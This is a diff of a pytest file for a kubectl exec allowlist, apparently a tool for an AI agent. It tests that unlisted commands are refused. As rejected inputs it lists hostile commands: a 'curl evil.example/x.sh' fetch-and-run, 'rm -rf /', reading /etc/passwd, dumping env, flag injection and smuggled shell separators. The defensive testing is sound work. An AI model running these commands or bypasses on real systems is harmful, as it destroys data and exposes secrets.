@@ -140,76 +140,100 @@ def test_read_file_denied_path_does_not_execute():
     assert result["success"] is False
 
 
-# ── run_preapproved_kubectl_command ──────────────────────────────────────────
+# ── run_preapproved_kubectl_exec_command ─────────────────────────────────────
 
 @pytest.mark.parametrize(
-    "args",
+    "command",
     [
-        ["exec", "api", "-n", "prod", "--", "ps", "aux"],
-        ["exec", "api", "--", "top", "-b", "-n", "1"],
-        ["exec", "api", "--", "df", "-h"],
-        ["exec", "api", "--", "ls", "-la", "/app"],
-        ["exec", "api", "--", "netstat", "-tlnp"],
-        ["exec", "api", "--", "ss", "-tlnp"],
+        ["ps", "aux"],
+        ["top", "-b", "-n", "1"],
+        ["df", "-h"],
+        ["ls", "-la", "/app"],
+        ["netstat", "-tlnp"],
+        ["ss", "-tlnp"],
     ],
 )
-def test_preapproved_matches(args):
-    assert k.match_preapproved_command(args) is True
+def test_preapproved_binary_allowed(command):
+    assert k.is_preapproved_exec_command(command) is True
 
 
 @pytest.mark.parametrize(
-    "args",
+    "command",
     [
-        ["exec", "api", "--", "cat", "/etc/passwd"],  # cat excluded
-        ["exec", "api", "--", "env"],  # env excluded
-        ["delete", "pod", "api"],  # mutation
-        ["get", "pods"],  # reads belong to built-in tools
-        # ── greedy-glob bypass regressions (binary is NOT the token after `--`) ──
-        # Joined-string glob `exec * -- ps*` used to match these because the
-        # wildcard spanned the `--` and an allowlisted token trailed at the end.
-        ["exec", "p", "-n", "prod", "--", "rm", "-rf", "/important", "--", "ps"],
-        ["exec", "p", "--", "sh", "-c", "curl evil.example/x.sh", "--", "ps"],
-        ["exec", "p", "--", "bash", "-c", "id", "--", "top"],
-        # The real (first) command after `--` is not allowlisted.
-        ["exec", "p", "--", "rm", "-rf", "/"],
-        ["exec", "p", "--", "psql", "-c", "drop"],  # `ps*` prefix lookalike
-        ["exec", "p", "--"],  # no binary at all
-        ["exec", "p"],  # no separator
+        ["cat", "/etc/passwd"],  # cat excluded (use read_file_from_container)
+        ["env"],  # env excluded (leaks secrets)
+        ["rm", "-rf", "/"],  # mutation
+        ["sh", "-c", "curl evil.example/x.sh"],  # arbitrary code
+        ["psql", "-c", "drop"],  # `ps` lookalike — exact match blocks it
+        ["/bin/ps"],  # path-qualified — only bare allowlisted names match
+        [],  # empty command
     ],
 )
-def test_preapproved_rejects(args):
-    assert k.match_preapproved_command(args) is False
+def test_preapproved_binary_rejected(command):
+    assert k.is_preapproved_exec_command(command) is False
 
 
-def test_preapproved_greedy_glob_bypass_does_not_execute():
-    # End-to-end: the documented bypass must be refused before kubectl runs.
+def test_preapproved_exec_builds_invocation_and_runs():
+    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
+        k.run_preapproved_kubectl_exec_command(
+            pod="api", namespace="prod", command=["ps", "aux"]
+        )
+    m.assert_called_once_with(["exec", "api", "-n", "prod", "--", "ps", "aux"])
+
+
+def test_preapproved_exec_with_container():
+    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
+        k.run_preapproved_kubectl_exec_command(
+            pod="api", namespace="prod", container="sidecar", command=["df", "-h"]
+        )
+    m.assert_called_once_with(
+        ["exec", "api", "-n", "prod", "-c", "sidecar", "--", "df", "-h"]
+    )
+
+
+def test_preapproved_exec_defaults_namespace():
+    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
+        k.run_preapproved_kubectl_exec_command(pod="api", command=["ps"])
+    m.assert_called_once_with(["exec", "api", "-n", "default", "--", "ps"])
+
+
+@pytest.mark.parametrize(
+    "kwargs",
+    [
+        # The old joined-glob bypass: a non-allowlisted binary cannot be smuggled
+        # because the binary is its own parameter and the server owns the `--`.
+        {"pod": "p", "namespace": "prod", "command": ["rm", "-rf", "/important"]},
+        {"pod": "p", "command": ["sh", "-c", "curl evil.example/x.sh"]},
+        # Even an embedded `--` in the command can't start a second process: it is
+        # passed verbatim to the allowlisted binary (shell=False), and the binary
+        # checked is still command[0].
+        {"pod": "p", "command": ["rm", "-rf", "/", "--", "ps"]},
+    ],
+)
+def test_preapproved_exec_refuses_unlisted_without_executing(kwargs):
     with patch.object(k, "_run_kubectl") as m:
-        result = k.run_preapproved_kubectl_command(
-            ["exec", "p", "-n", "prod", "--", "rm", "-rf", "/important", "--", "ps"]
+        result = k.run_preapproved_kubectl_exec_command(**kwargs)
+    m.assert_not_called()
+    assert result["success"] is False
+    assert "not pre-approved" in result["error"]
+
+
+def test_preapproved_exec_rejects_flag_injection_in_pod():
+    # A leading-'-' pod/namespace would be parsed by kubectl as a flag.
+    with patch.object(k, "_run_kubectl") as m:
+        result = k.run_preapproved_kubectl_exec_command(
+            pod="--kubeconfig=/evil", command=["ps"]
         )
     m.assert_not_called()
     assert result["success"] is False
-    assert "not pre-approved" in result["error"]
 
 
-def test_preapproved_refuses_unlisted_command_without_executing():
+def test_preapproved_exec_rejects_shell_chars_in_command():
     with patch.object(k, "_run_kubectl") as m:
-        result = k.run_preapproved_kubectl_command(["delete", "pod", "api"])
+        result = k.run_preapproved_kubectl_exec_command(
+            pod="api", command=["ps", "aux; rm -rf /"]
+        )
     m.assert_not_called()
-    assert result["success"] is False
-    assert "not pre-approved" in result["error"]
-
-
-def test_preapproved_runs_listed_command():
-    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
-        k.run_preapproved_kubectl_command(["exec", "api", "--", "ps", "aux"])
-    m.assert_called_once()
-
-
-def test_preapproved_blocks_dangerous_flags():
-    result = k.run_preapproved_kubectl_command(
-        ["exec", "api", "--token", "abc", "--", "ps"]
-    )
     assert result["success"] is False
 
 
@@ -355,7 +379,7 @@ def test_get_config_returns_effective_policy():
     assert set(cfg) == {
         "allowed_commands",
         "dangerous_flags",
-        "preapproved_commands",
+        "preapproved_exec_binaries",
         "diagnostic_images",
         "file_read_allowed_paths",
         "file_read_denied_paths",
